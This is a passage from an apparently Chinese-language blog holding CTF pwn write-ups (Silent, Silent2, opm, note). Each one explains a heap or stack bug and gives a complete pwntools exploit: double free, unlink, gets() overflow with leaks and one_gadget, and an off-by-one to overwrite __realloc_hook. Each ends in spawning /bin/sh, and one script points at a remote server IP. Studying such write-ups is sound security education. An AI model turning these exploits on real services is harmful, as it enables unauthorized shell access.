class="line">success(<span class="string">'fake_chunk =&gt; '</span> + hex(fake_chunk))</span><br><span class="line">success(<span class="string">'system_plt =&gt; '</span> + hex(system_plt))</span><br><span class="line">add(<span class="number">0x50</span> , <span class="string">'a'</span> * <span class="number">0x4f</span>)<span class="comment">#chunk 0rabbish</span></span><br><span class="line">add(<span class="number">0x50</span> , <span class="string">'b'</span> * <span class="number">0x4f</span>)<span class="comment">#chunk 1rabbish</span></span><br><span class="line">add(<span class="number">0x50</span> , <span class="string">'c'</span> * <span class="number">0x4f</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">dele(<span class="number">0</span>)<span class="comment">#fastbin-&gt;chunk0</span></span><br><span class="line">dele(<span class="number">1</span>)<span class="comment">#fastbin-&gt;chunk1-&gt;chunk0</span></span><br><span class="line">debug()</span><br><span class="line">dele(<span class="number">0</span>)<span class="comment">#fastbin-&gt;chunk0-&gt;chunk1-&gt;chunk0</span></span><br><span class="line">add(<span class="number">0x50</span> , p64(fake_chunk))<span class="comment">#fastbin-&gt;chunk1-&gt;chunk0-&gt;0x601ffafd</span></span><br><span class="line">add(<span class="number">0x50</span> , <span class="string">'/bin/sh\x00'</span>)<span class="comment">#fastbin-&gt;chunk0-&gt;0x601ffarabbish</span></span><br><span class="line">add(<span class="number">0x50</span> , <span class="string">'c'</span> * <span class="number">0x4f</span>)<span class="comment">#fastbin-&gt;0x601ffacommand(chunk1)</span></span><br><span class="line">add(<span class="number">0x50</span> , <span class="string">'A'</span> * <span class="number">0xe</span> + p64(system_plt))<span class="comment">#free=&gt;system</span></span><br><span class="line">dele(<span class="number">1</span>)<span class="comment">#free(chunk1)=&gt;system('/bin/sh\x00')</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="0x02-Silent2"><a href="#0x02-Silent2" class="headerlink" title="0x02 Silent2"></a>0x02 Silent2</h2><ul><li><strong>漏洞位置</strong><br>几乎和<strong>Silent</strong>一样的，一个<strong>dangling_ptr</strong>，一个<strong>UAF</strong>，不过在申请堆块的时候做了限制，，需要大于<strong>0x7f</strong>，即不能在<strong>fastbin</strong>的范围内。</li><li><strong>利用思路</strong><br>有<strong>UAF</strong>和<strong>dangling_ptr</strong>自然是构造<strong>unlink</strong>。<blockquote><p>论<strong>sleep</strong>的重要性<br>经过这到题，我领悟到了<strong>sleep</strong>的重要性，尤其是这种没有信息交互的地方更是致命，明明各种条件都构造好了，都满足了，却迟迟不能稳定起<strong>shell</strong>，最后<strong>sleep</strong>之后就顺利稳定起<strong>shell</strong>了。</p></blockquote></li><li><strong>my-exp</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">'./silent2'</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">'39.107.32.132'</span> , <span class="number">10001</span>)<span class="comment">#nc 39.107.32.132 10001</span></span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(length , text)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(str(length))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(text)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dele</span><span class="params">(num)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(num , text)</span>:</span></span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(str(num))</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(text)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line">p.sendline(<span class="string">''</span>)</span><br><span class="line">sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line"><span class="keyword">print</span> pidof(p)[<span class="number">0</span>]</span><br><span class="line">raw_input()</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./silent2'</span>)</span><br><span class="line">chunk0_addr = <span class="number">0x6020d8</span></span><br><span class="line">p.recvuntil(<span class="string">'==+RWBXtIRRV+.+IiYRBYBRRYYIRI;VitI;=;..........:::.::;::::...;;;:.'</span>)</span><br><span class="line">add(<span class="number">0x80</span> , <span class="string">'1'</span> * <span class="number">0x7f</span>)</span><br><span class="line">add(<span class="number">0x80</span> , <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">add(<span class="number">0x80</span> , <span class="string">'3'</span> * <span class="number">0x7f</span>)</span><br><span class="line">add(<span class="number">0x80</span> , <span class="string">'a'</span> * <span class="number">0x7f</span>)</span><br><span class="line">add(<span class="number">0x80</span> , <span class="string">'b'</span> * <span class="number">0x7f</span>)</span><br><span class="line">add(<span class="number">0x100</span> , <span class="string">'c'</span> * <span class="number">0xff</span>)</span><br><span class="line">add(<span class="number">0x80</span> , <span class="string">'d'</span> * <span class="number">0x7f</span>)</span><br><span class="line">dele(<span class="number">4</span>)</span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">payload = p64(<span class="number">0</span>) + p64(<span class="number">0x110</span>) + p64(chunk0_addr - <span class="number">0x18</span>) + p64(chunk0_addr - <span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x190</span> , <span class="string">'e'</span> * <span class="number">0x80</span> + p64(<span class="number">0x110</span>) + p64(<span class="number">0x90</span>) + <span class="string">'e'</span> * <span class="number">0x80</span> + p64(<span class="number">0x90</span>) + p64(<span class="number">0x81</span>))</span><br><span class="line">edit(<span class="number">3</span> , payload)</span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line"><span class="comment">#----finish unlink----</span></span><br><span class="line">free_got = elf.got[<span class="string">'free'</span>]</span><br><span class="line">success(<span class="string">'free_got =&gt; '</span> + hex(free_got))</span><br><span class="line">system_plt = elf.plt[<span class="string">'system'</span>]</span><br><span class="line">success(<span class="string">'system_plt =&gt; '</span> + hex(system_plt))</span><br><span class="line">edit(<span class="number">3</span> , p64(free_got))</span><br><span class="line">edit(<span class="number">0</span> , p64(system_plt))</span><br><span class="line">dele(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="0x03-opm"><a href="#0x03-opm" class="headerlink" title="0x03 opm"></a>0x03 opm</h2><p>分析题目可得出数据结构如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">stru</span>&#123;</span></span><br><span class="line">    <span class="keyword">int</span> (func*)();</span><br><span class="line">    <span class="keyword">char</span> *name_ptr;</span><br><span class="line">    <span class="keyword">int</span> length;</span><br><span class="line">    <span class="keyword">int</span> punches;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><strong>漏洞位置</strong><br>在<strong>add</strong>函数中存在两个<strong>gets()</strong>函数，存在缓冲区溢出。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-2dc0d6df20ed6060.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Add"></li></ul><ul><li><strong>利用思路</strong><br>观察栈分布，<strong>gets()</strong>超过<strong>0x80</strong>长度后会覆盖掉栈上的结构体变量，并且<strong>add</strong>函数中有<strong>2</strong>次覆盖的机会，第<strong>1</strong>次覆盖将会影响到<strong>length</strong>的存放，第<strong>2</strong>次覆盖将会影响到<strong>punches</strong>的存放，以及<strong>kill</strong>函数的参数。<br>在<strong>kill</strong>函数中，可以将传进参数<strong>a1 + 8</strong>作为地址中的内容打印出来，以及将<strong>a1 + 0x18</strong>位置的内容以<strong>16</strong>进制的形式打印出来。在我们通过溢出控制传入参数后可以做<strong>leak</strong>。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-a51f6af9e654129b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="kill"><br>从<strong>checksec</strong>中可以看到是保护机制全开的，所以我们需要<strong>leak</strong>出程序段基址和<strong>libc</strong>基址。结合<strong>kill</strong>函数和结构体的数据结构可以初步确定<strong>leak</strong>方式为覆盖如<strong>kill</strong>的参数，使参数<strong>+ 8</strong>放的是函数的<strong>got</strong>表<del>，使参数<strong>+ 0x18</strong>放的是程序段的地址</del>，两次<strong>leak</strong>不需要同时进行。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-cbbae21b44a2a86f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="checksec"><br>难点就在于如何<strong>leak</strong>，由于<strong>gets()</strong>会在输入后面加上<strong>\x00</strong>，所以我们并不能随心所欲地将地址覆盖成我们想要的地址，而只能覆盖成以<strong>00</strong>结尾的地址，这就需要我们事先将<strong>got</strong>表布置在以<strong>08</strong>结尾的地址或将程序段地址布置在以<strong>18</strong>结尾的地址。若我们事先知道程序段的基址的话，可以通过在输入<strong>name_ptr</strong>时轻松地将<strong>got</strong>表布置在<strong>08</strong>的地址。现在需要解决的问题就是如何得到程序段基址，即如何将程序段地址布置在<strong>18</strong>的地址，由于给<strong>punches</strong>赋值是在第二次覆盖掉结构体后，所以不能用<strong>+ 0x18</strong>来进行<strong>leak</strong>，推翻上一段的利用思路。所以我们只能够通过构造指向程序段的指针来利用第一个<strong>%s</strong>进行<strong>leak</strong>。<br>在<strong>leak</strong>出两个地址过后，由于<strong>show</strong>函数会将<strong>add</strong>函数返回的结构体的第一个<strong>8</strong>字节作为函数的入口地址执行该函数，而且<strong>add</strong>的返回值为我们第二次覆盖后的结构体，可控，所以我们可以尝试将该地址指向一个<strong>one_gadget</strong>就能起<strong>shell</strong>了。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-113ac1f8602bd5be.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="Show"></li></ul><blockquote><p><strong>leak</strong>程序段基址<br>根据<strong>WriteUp</strong>分析了半天才看出来是怎么构造的，还是太菜了，这也是为什么这个利用思路写的这么拖沓的原因。。。我们先多<strong>add</strong>几次，将地址抬高到<strong>_d00</strong>的位置，再次<strong>add</strong>时，第一次覆盖结构体时输入<strong>0x81</strong>位，将结构体覆盖为<strong>00xx</strong>，使后面的<strong>name_ptr、length、punches</strong>都写到<strong>00xx</strong>后的地址上去，此时<strong>00xx + 8</strong>为<strong>name_ptr</strong>指针，指向<strong>name</strong>字符串，但这个<strong>name_ptr</strong>的值为<strong><em>d_</em></strong>，若我们能将后面一个字节覆盖成<strong>00</strong>就可以在第二次覆盖结构体时将结构体再次改为<strong>00xx</strong>去，利用<strong>kill</strong>打印出我们事先在<strong>_d00</strong>布置好的程序段地址。此时就利用字节不对齐的方式进行最低位改为<strong>00</strong>的操作，在将<strong>_d00</strong>布置好后的下一次<strong>add</strong>中的第一次覆盖我们将结构体覆盖为<strong>00xx</strong>此次<strong>add</strong>不触发第二次覆盖。然后再在下一次的<strong>add</strong>中的第一次覆盖时，我们将结构体覆盖为<strong>00xx - 15</strong>，覆盖后会在对<strong>length</strong>进行赋值，即<strong>00xx - 15 + 16</strong>进行赋值时，将刚刚的<strong><em>d_</em></strong>最低位(地址为<strong>00xx + 9</strong>)覆盖成<strong>00</strong>然后在第二次覆盖时，将结构体又覆盖会<strong>00xx</strong>，调用<strong>kill</strong>函数即可实现<strong>leak</strong>。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-fa947dba98ac4b06.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="第一次add结束"><br><img src="https://upload-images.jianshu.io/upload_images/8447551-8309ff39c467c6dd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="第二次add结束"></p></blockquote><ul><li><strong>my-exp</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">'./opm'</span>)</span><br><span class="line">    libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">print</span> <span class="string">'time is up'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name , punches)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'(E)xit\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'A'</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'name:\n'</span>)</span><br><span class="line">    p.sendline(name)</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    p.recvuntil(<span class="string">'punch?\n'</span>)</span><br><span class="line">    p.sendline(str(punches))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">'(E)xit\n'</span>)</span><br><span class="line">    p.sendline(<span class="string">'S'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">print</span> pidof(p)[<span class="number">0</span>]</span><br><span class="line">    raw_input()</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./opm'</span>)</span><br><span class="line"><span class="comment">#one_gadget = 0x45216 0x4526a 0xf02a4 0xf1147</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#step 1 leak elf_base</span></span><br><span class="line">add(<span class="string">'a'</span> * <span class="number">0x30</span> , <span class="number">0x10</span>)</span><br><span class="line">add(<span class="string">'b'</span> * <span class="number">0x30</span> , <span class="number">0x20</span>)</span><br><span class="line">add(<span class="string">'c'</span> , <span class="number">0x30</span>)</span><br><span class="line">add(<span class="string">'d'</span> * <span class="number">0x80</span> + <span class="string">'\x63'</span> , <span class="number">0x40</span>)</span><br><span class="line">debug()</span><br><span class="line">add(<span class="string">'e'</span> * <span class="number">0x80</span> + <span class="string">'\x54'</span> , <span class="string">'1'</span> * <span class="number">0x80</span> + <span class="string">'\x63'</span>)</span><br><span class="line"><span class="comment">#use 0054 + 0x10 (v6 -&gt; length) to make a d00  ,  change 0054 to 0063 to point d00</span></span><br><span class="line">elf.address = u64(p.recvuntil(<span class="string">'&gt;'</span>)[<span class="number">1</span>:<span class="number">-1</span>] + <span class="string">'\x00'</span> * <span class="number">2</span>) - <span class="number">0xb30</span></span><br><span class="line">success(<span class="string">'elf_base =&gt; '</span> + hex(elf.address))</span><br><span class="line"></span><br><span class="line"><span class="comment">#step 2 use f00 to leak libc_base</span></span><br><span class="line">atoi_got = elf.got[<span class="string">'atoi'</span>]</span><br><span class="line">success(<span class="string">'atoi_got =&gt; '</span> + hex(atoi_got))</span><br><span class="line">add(<span class="string">'f'</span> * <span class="number">8</span> + p64(atoi_got) , <span class="number">0x50</span>)</span><br><span class="line">add(<span class="string">'g'</span>  , <span class="string">'g'</span> * <span class="number">0x80</span>)</span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">'&gt;'</span>)[<span class="number">1</span>:<span class="number">-1</span>] + <span class="string">'\x00'</span> * <span class="number">2</span>) - libc.symbols[<span class="string">'atoi'</span>]</span><br><span class="line">success(<span class="string">'libc_base =&gt; '</span> + hex(libc.address))</span><br><span class="line"></span><br><span class="line"><span class="comment">#step 3 use 000 and show() to trigger one_gadget</span></span><br><span class="line">one_gadget = libc.address + <span class="number">0x4526a</span></span><br><span class="line">add(<span class="string">'h'</span> * <span class="number">0x60</span> + p64(one_gadget), <span class="string">''</span>)</span><br><span class="line">add(<span class="string">'i'</span> * <span class="number">0x80</span> , <span class="string">''</span>)</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ul><hr><h2 id="0x04-note"><a href="#0x04-note" class="headerlink" title="0x04 note"></a>0x04 note</h2><ul><li><strong>漏洞位置</strong></li></ul><p>该程序为socket程序，绑定为1234端口，需要系统有note的用户权限。程序在<strong>change_title</strong>的功能中存在<strong>off_by_one</strong>漏洞。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-57f70e10e520e9a6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="off_by_one"><br>不过由于前面<strong>check_asc()</strong>中的限制，导致只能用<strong>0x0a、0x21、0x22、0x23、0x26、0x27、0x3F、0x40</strong>这几个规定内的字节进行溢出。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-65afdd29f0019e73.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="check_asc"></p><ul><li><strong>利用思路</strong><br>题目限制只能<strong>realloc3次</strong>，利用<strong>0x40</strong>进行<strong>off_by_one</strong>并布置<strong>unlink</strong>环境，在此之前应该首先利用<strong>change_content</strong>功能构造好满足<strong>0x40</strong>大小的下一个<strong>chunk head</strong>。由于<strong>0x40</strong>大小的堆块在<strong>fastbin</strong>的范围内，无法直接<strong>free</strong>触发<strong>unlink</strong>，于是第二次<strong>realloc</strong>将该<strong>chunk</strong>放入<strong>fastbin</strong>中，在第三次<strong>realloc</strong>时触发<strong>malloc_consolidate</strong>进行<strong>unlink</strong>。<strong>unlink</strong>后，使<strong>.bss</strong>上的<strong>title</strong>指向<strong>comment</strong>指针，再配合<strong>change_comment</strong>功能，实现任意地址写，最终采用写<strong>realloc_hook</strong>为<strong>system</strong>的方法<strong>get shell</strong>。(不知道是否本地环境的问题，一开始就能直接<strong>leak libc</strong>)<blockquote><p><strong>realloc</strong><br>函数原型为<strong>realloc(ptr, size)</strong>，其中<strong>ptr</strong>为指向堆的指针，<strong>size</strong>为需要<strong>realloc</strong>的大小，根据<strong>size</strong>的大小有以下几种情况：</p><ul><li><strong>size = 0</strong>时，相当于<strong>free(ptr)</strong>。</li><li><strong>size &lt; ptr原大小</strong>时，会将原<strong>chunk</strong>分割为两部分，<strong>free</strong>掉后面的<strong>chunk</strong>。</li><li><strong>size = ptr原大小</strong>时，没什么卵用，不会进行任何操作。<strong>注：该等于为将size对齐后相等。</strong></li><li><strong>size &gt; ptr原大小</strong>时，若<strong>ptr</strong>下方为<strong>top chunk</strong>或者下方存在<strong>fastbin</strong>之外的<strong>free chunk</strong>并且<strong>size(free chunk) + size(ptr原大小) ≥ size</strong>，则将该堆块大小扩展至<strong>size</strong>，若不满足上述条件，则相当于<strong>free(ptr)</strong>然后<strong>malloc(size)</strong>。</li></ul></blockquote></li></ul><blockquote><p><strong>malloc_consolidate</strong><br>该函数会将<strong>fastbin</strong>中的所有<strong>chunk</strong>整合到<strong>unsort bin</strong>中，并且在从<strong>fastbin</strong>中摘下<strong>chunk</strong>时会检查相邻的堆块是否为<strong>free</strong>状态，若为<strong>free</strong>状态则将触发堆融合。本题采用<strong>malloc</strong>大于<strong>top chunk</strong>的<strong>size</strong>触发<strong>malloc_consolidate</strong>。</p></blockquote><ul><li><strong>my-exp.py</strong><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = remote(<span class="string">'0'</span> , <span class="number">1234</span>)</span><br><span class="line">libc = ELF(<span class="string">'/lib/x86_64-linux-gnu/libc-2.23.so'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line"><span class="keyword">print</span> <span class="string">'time is up'</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_title</span><span class="params">(title)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'---&gt;&gt;\n'</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'title:'</span>)</span><br><span class="line">p.send(title)<span class="comment">#off_by_one</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_content</span><span class="params">(size , content)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'---&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'256):'</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">'content:'</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_comment</span><span class="params">(comment)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'---&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'comment:'</span>)</span><br><span class="line">p.sendline(comment)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">()</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'---&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'is:'</span>)</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">#step1 leak libc_base</span></span><br><span class="line">libc.address = u64(show().ljust(<span class="number">8</span> , <span class="string">'\x00'</span>)) - <span class="number">0x3c4b78</span></span><br><span class="line">success(<span class="string">'libc_base =&gt; '</span> + hex(libc.address))</span><br><span class="line"></span><br><span class="line">system_addr = libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">info(<span class="string">'system_addr =&gt; '</span> + hex(system_addr))</span><br><span class="line">realloc_hook = libc.symbols[<span class="string">'__realloc_hook'</span>]</span><br><span class="line">info(<span class="string">'realloc_hook =&gt; '</span> + hex(realloc_hook))</span><br><span class="line">binsh_addr = libc.search(<span class="string">'/bin/sh\x00'</span>).next()</span><br><span class="line">info(<span class="string">'binsh_addr =&gt; '</span> + hex(binsh_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#step2 make unlink</span></span><br><span class="line">content = <span class="number">0x602070</span></span><br><span class="line">payload = p64(<span class="number">0x30</span>) + p64(<span class="number">0x20</span>) + p64(content - <span class="number">0x18</span>) + p64(content - <span class="number">0x10</span>) + p64(<span class="number">0x20</span>) + <span class="string">'\x40'</span></span><br><span class="line">change_content(<span class="number">0x78</span> , <span class="number">0x38</span> * <span class="string">'A'</span> + p64(<span class="number">0x41</span>))</span><br><span class="line">change_title(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#step3 free content to fastbin</span></span><br><span class="line">change_content(<span class="number">0x100</span> , <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#step4 trigger malloc_consolidate to unlink</span></span><br><span class="line">change_content(<span class="number">0x20000</span> , <span class="string">''</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#step5 realloc_hook -&gt; system</span></span><br><span class="line">change_title(p64(realloc_hook) + <span class="string">'\n'</span>)</span><br><span class="line">change_comment(p64(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment">#step6 reset chance &amp; content -&gt; /bin/sh</span></span><br><span class="line">change_title(p64(<span class="number">0x602050</span>) + p64(binsh_addr) + <span class="string">'\n'</span>)</span><br><span class="line">change_comment(p64(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment">#step7 realloc(content , size) =&gt; realloc_hook(binsh_addr) =&gt; system('/bin/sh\x00')</span></span><br><span class="line">p.recvuntil(<span class="string">'option---&gt;&gt;'</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'(64-256):'</span>)</span><br><span class="line">p.sendline(<span class="string">''</span>)<span class="comment">#size doesn't matter</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#Get Shell &amp; Have Fun</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刷Jarvis OJ时学到的新姿势【不定时更新】</title>
